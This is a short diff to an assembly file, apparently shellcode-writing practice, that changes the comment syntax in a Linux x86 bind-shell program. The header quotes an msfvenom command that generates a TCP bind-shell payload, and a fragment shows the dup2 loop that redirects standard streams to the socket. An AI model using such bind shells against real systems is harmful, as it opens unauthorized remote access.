@@ -1,7 +1,6 @@
-#!/bin/bash
-#Filename: schema.nasm
-#Author:  MrSquid
-#Purpose: Bindshell.nasm code with port easily configurable (Nasm skeleton code obtain from sudo msfvenom -p linux/x86/shell_bind_tcp LPORT=9999 -b "\x00" -i 0 -f raw |ndisasm -u -
+;Filename: schema.nasm
+;Author:  MrSquid
+;Purpose: Bindshell.nasm code with port easily configurable (Nasm skeleton code obtain from sudo msfvenom -p linux/x86/shell_bind_tcp LPORT=9999 -b "\x00" -i 0 -f raw |ndisasm -u -
 
 
 global _start  
@@ -49,7 +48,7 @@ _start:
 	dup:
 		push byte +0x3f ;63 in decimal (systemcall dup)
 		pop eax
-		;os.dup2(rem.fileno(),0) #STDIN,STOUT,STDERR redirection 
+		;os.dup2(rem.fileno(),0) ;STDIN,STOUT,STDERR redirection 
 	    	;os.dup2(rem.fileno(),1)
 	    	;os.dup2(rem.fileno(),2)
 		int 0x80
